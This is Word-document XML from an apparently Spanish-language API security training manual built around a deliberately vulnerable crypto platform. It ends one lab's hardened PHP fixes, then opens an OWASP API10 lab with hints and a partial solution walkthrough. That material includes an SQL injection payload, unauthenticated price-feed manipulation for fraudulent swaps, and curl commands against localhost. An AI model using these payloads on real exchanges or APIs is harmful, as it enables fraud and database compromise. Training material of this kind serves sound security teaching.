      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>3. Eliminar Informacion de Debug y Servidor</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;?php</w:t>
        <w:br/>
        <w:t>// api/internal/rates.php - Respuesta limpia sin informacion de infraestructura</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Solo devolver las cotizaciones, SIN informacion del servidor</w:t>
        <w:br/>
        <w:t>echo json_encode([</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "status" =&gt; "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "rates" =&gt; $rates,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "last_updated" =&gt; $last_updated</w:t>
        <w:br/>
        <w:t xml:space="preserve">    // NO incluir: hostname, db_host, db_name, api_version</w:t>
        <w:br/>
        <w:t>]);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>4. Proteger la Escritura de Precios con Autenticacion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;?php</w:t>
        <w:br/>
        <w:t>// api/internal/rates.php - POST protegido</w:t>
        <w:br/>
        <w:br/>
        <w:t>if ($_SERVER['REQUEST_METHOD'] === 'POST') {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    // Verificar IP interna</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if (!$is_internal) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        http_response_code(403);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        exit;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    // Verificar token de servicio</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if (!hash_equals($valid_token, $service_token)) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        http_response_code(401);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        exit;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    // Validar los precios recibidos</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $new_rates = $data['rates'] ?? [];</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $allowed_currencies = ['BTC', 'ETH', 'SOL', 'ADA', 'XRP'];</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    foreach ($new_rates as $currency =&gt; $price) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if (!in_array($currency, $allowed_currencies)) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">            http_response_code(400);</w:t>
        <w:br/>
        <w:t xml:space="preserve">            echo json_encode(["error" =&gt; "Moneda no permitida: $currency"]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">            exit;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        if (!is_numeric($price) || (float)$price &lt;= 0) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">            http_response_code(400);</w:t>
        <w:br/>
        <w:t xml:space="preserve">            echo json_encode(["error" =&gt; "Precio invalido para $currency"]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">            exit;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        // Validar que el cambio de precio no sea mayor al 10% respecto al actual</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $current_price = getCurrentPrice($pdo, $currency);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $change_pct = abs(((float)$price - $current_price) / $current_price) * 100;</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        if ($change_pct &gt; 10) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">            http_response_code(400);</w:t>
        <w:br/>
        <w:t xml:space="preserve">            echo json_encode([</w:t>
        <w:br/>
        <w:t xml:space="preserve">                "error" =&gt; "Cambio de precio excesivo para $currency",</w:t>
        <w:br/>
        <w:t xml:space="preserve">                "current" =&gt; $current_price,</w:t>
        <w:br/>
        <w:t xml:space="preserve">                "proposed" =&gt; $price,</w:t>
        <w:br/>
        <w:t xml:space="preserve">                "change_pct" =&gt; round($change_pct, 2),</w:t>
        <w:br/>
        <w:t xml:space="preserve">                "max_allowed_pct" =&gt; 10</w:t>
        <w:br/>
        <w:t xml:space="preserve">            ]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">            exit;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        }</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    // Usar prepared statements para actualizar</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $stmt = $pdo-&gt;prepare("UPDATE crypto_prices SET price = ?, updated_at = NOW() WHERE symbol = ?");</w:t>
        <w:br/>
        <w:t xml:space="preserve">    foreach ($new_rates as $currency =&gt; $price) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $stmt-&gt;execute([(float)$price, $currency]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    // Registrar en log de auditoria</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $audit_stmt = $pdo-&gt;prepare(</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "INSERT INTO audit_log (action, details, source_ip, service_token_hash, created_at)</w:t>
        <w:br/>
        <w:t xml:space="preserve">         VALUES ('price_update', ?, ?, ?, NOW())"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    );</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $audit_stmt-&gt;execute([</w:t>
        <w:br/>
        <w:t xml:space="preserve">        json_encode($new_rates),</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $client_ip,</w:t>
        <w:br/>
        <w:t xml:space="preserve">        hash('sha256', $service_token)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ]);</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>5. Implementar Proceso de Gestion de Inventario de APIs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;?php</w:t>
        <w:br/>
        <w:t>// config/api_registry.php - Registro centralizado de APIs</w:t>
        <w:br/>
        <w:br/>
        <w:t>/**</w:t>
        <w:br/>
        <w:t xml:space="preserve"> * Registro de todas las APIs de la plataforma.</w:t>
        <w:br/>
        <w:t xml:space="preserve"> * Cada entrada debe contener:</w:t>
        <w:br/>
        <w:t xml:space="preserve"> * - version: version de la API</w:t>
        <w:br/>
        <w:t xml:space="preserve"> * - status: active | deprecated | beta | internal</w:t>
        <w:br/>
        <w:t xml:space="preserve"> * - auth_required: si requiere autenticacion</w:t>
        <w:br/>
        <w:t xml:space="preserve"> * - network: public | internal</w:t>
        <w:br/>
        <w:t xml:space="preserve"> * - decommission_date: fecha de descomision (si aplica)</w:t>
        <w:br/>
        <w:t xml:space="preserve"> */</w:t>
        <w:br/>
        <w:t>return [</w:t>
        <w:br/>
        <w:t xml:space="preserve">    '/api/v1/auth/login.php' =&gt; [</w:t>
        <w:br/>
        <w:t xml:space="preserve">        'version' =&gt; 'v1',</w:t>
        <w:br/>
        <w:t xml:space="preserve">        'status' =&gt; 'active',</w:t>
        <w:br/>
        <w:t xml:space="preserve">        'auth_required' =&gt; false,</w:t>
        <w:br/>
        <w:t xml:space="preserve">        'network' =&gt; 'public',</w:t>
        <w:br/>
        <w:t xml:space="preserve">        'rate_limit' =&gt; '5/minute'</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ],</w:t>
        <w:br/>
        <w:t xml:space="preserve">    '/api/v1/crypto/swap.php' =&gt; [</w:t>
        <w:br/>
        <w:t xml:space="preserve">        'version' =&gt; 'v1',</w:t>
        <w:br/>
        <w:t xml:space="preserve">        'status' =&gt; 'active',</w:t>
        <w:br/>
        <w:t xml:space="preserve">        'auth_required' =&gt; true,</w:t>
        <w:br/>
        <w:t xml:space="preserve">        'network' =&gt; 'public',</w:t>
        <w:br/>
        <w:t xml:space="preserve">        'rate_limit' =&gt; '10/minute'</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ],</w:t>
        <w:br/>
        <w:t xml:space="preserve">    '/api/internal/rates.php' =&gt; [</w:t>
        <w:br/>
        <w:t xml:space="preserve">        'version' =&gt; 'internal',</w:t>
        <w:br/>
        <w:t xml:space="preserve">        'status' =&gt; 'active',</w:t>
        <w:br/>
        <w:t xml:space="preserve">        'auth_required' =&gt; true,</w:t>
        <w:br/>
        <w:t xml:space="preserve">        'network' =&gt; 'internal',</w:t>
        <w:br/>
        <w:t xml:space="preserve">        'rate_limit' =&gt; 'none',</w:t>
        <w:br/>
        <w:t xml:space="preserve">        'allowed_ips' =&gt; ['10.0.0.0/8']</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ],</w:t>
        <w:br/>
        <w:t xml:space="preserve">    // NO debe existir:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    // '/api/v2/auth/login.php' -&gt; DESCOMISIONADO</w:t>
        <w:br/>
        <w:t>];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>LAB 10 - Consumo Inseguro de APIs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Referencia OWASP: API10:2023 - Unsafe Consumption of APIs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Objetivo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Explotar la confianza ciega que la plataforma CryptoVulnX deposita en datos provenientes de APIs externas (simuladas) para:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Manipular precios de criptomonedas a traves del feed externo de cotizaciones y ejecutar swaps a tasas fraudulentas.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ejecutar una cadena completa de arbitraje: bajar precio, comprar, restaurar precio, vender.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Inyectar SQL a traves del campo de precios que se inserta sin sanitizar en la base de datos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Contexto</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>La vulnerabilidad API10:2023 se produce cuando una aplicacion consume datos de APIs externas o de terceros sin aplicar el mismo nivel de validacion y sanitizacion que aplica (o deberia aplicar) a los datos introducidos por los usuarios. Los desarrolladores tienden a confiar en los datos que provienen de otras APIs, asumiendo que son seguros y correctamente formateados.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>En CryptoVulnX, el flujo vulnerable es el siguiente:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">El endpoint </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/api/internal/rates.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> actua como un </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>feed de cotizaciones externo</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (simula una API de un proveedor de precios como CoinGecko o Binance). En un entorno real, este seria un servicio externo que proporciona precios de mercado.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">El endpoint </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/api/v1/crypto/swap.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> consulta la tabla </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>crypto_prices</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> para obtener las tasas de cambio al momento de ejecutar un swap. Estas tasas son actualizadas por el feed externo.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>El problema critico es que:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="850"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">El endpoint </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/api/internal/rates.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> acepta POST sin autenticacion para actualizar precios.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="850"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Los valores recibidos del "feed externo" se insertan directamente en la base de datos </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>sin validacion de tipo, rango o sanitizacion</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="850"/>
      </w:pPr>
      <w:r>
        <w:t>El endpoint de swap consume estos precios sin verificar si son razonables o si han cambiado drasticamente.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="850"/>
      </w:pPr>
      <w:r>
        <w:t>Los valores del feed se insertan en consultas SQL sin usar prepared statements, permitiendo inyeccion SQL.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Este escenario simula una situacion real donde un atacante compromete (o suplanta) una API externa de la que depende la plataforma.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Endpoints Involucrados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C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Metodo</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Endpoint</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Descripcion</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>POST</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/internal/rates.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Simula feed externo de cotizaciones (actualiza precios sin auth)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/internal/rates.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Consulta precios actuales</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>POST</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v1/crypto/swap.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Intercambio de criptomonedas (consume precios sin validar)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Dificultad</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Alta</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Requiere comprender la cadena de dependencia entre APIs, la logica de negocio del swap, y tecnicas de inyeccion SQL a traves de canales indirectos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pistas</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 1 - Reconocimiento de la cadena de dependencia</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">El endpoint de swap no calcula precios internamente; los obtiene de la tabla </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>crypto_prices</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. ¿Quien actualiza esa tabla? Investiga el endpoint </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/api/internal/rates.php</w:t>
      </w:r>
      <w:r>
        <w:t>. ¿Acepta POST? ¿Requiere autenticacion? ¿Valida los datos que recibe?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 2 - Manipulacion del feed de precios</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Envia un POST a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/api/internal/rates.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> con un JSON como </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>{"rates":{"BTC":"0.01"}}</w:t>
      </w:r>
      <w:r>
        <w:t>. Si el precio se actualiza sin validacion, podras comprar BTC a centavos a traves del endpoint de swap. Despues de comprar, restaura el precio original y vende para materializar la ganancia.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 3 - Inyeccion SQL via canal indirecto</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Los precios del feed externo se insertan en la base de datos. Si el valor del precio no se sanitiza, puedes inyectar SQL a traves del campo de precio. Intenta: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>{"rates":{"BTC":"1' OR '1'='1"}}</w:t>
      </w:r>
      <w:r>
        <w:t>. Esto es una inyeccion SQL de segundo orden: el payload entra por la API de rates y se ejecuta cuando el endpoint de swap consulta la tabla de precios.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Solucion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Solucion 1: Manipulacion de Precios - Cadena Completa de Arbitraje</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 1</w:t>
      </w:r>
      <w:r>
        <w:t>: Autenticarse para obtener un token JWT.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>TOKEN=$(curl -s -X POST http://localhost/appsec/api/v1/auth/login.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"email":"attacker@test.com","password":"password123"}' | \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  python -c "import sys,json; print(json.load(sys.stdin)['token'])")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 2</w:t>
      </w:r>
      <w:r>
        <w:t>: Consultar el precio actual de BTC y el saldo de la cuenta.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Verificar precios actuales</w:t>
        <w:br/>
        <w:t>curl -s http://localhost/appsec/api/internal/rates.php</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "rates": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "BTC": "67542.50",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "ETH": "3521.80",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "SOL": "142.30",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "USDT": "1.00"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  },</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "last_updated": "2026-03-28T14:00:00Z"</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
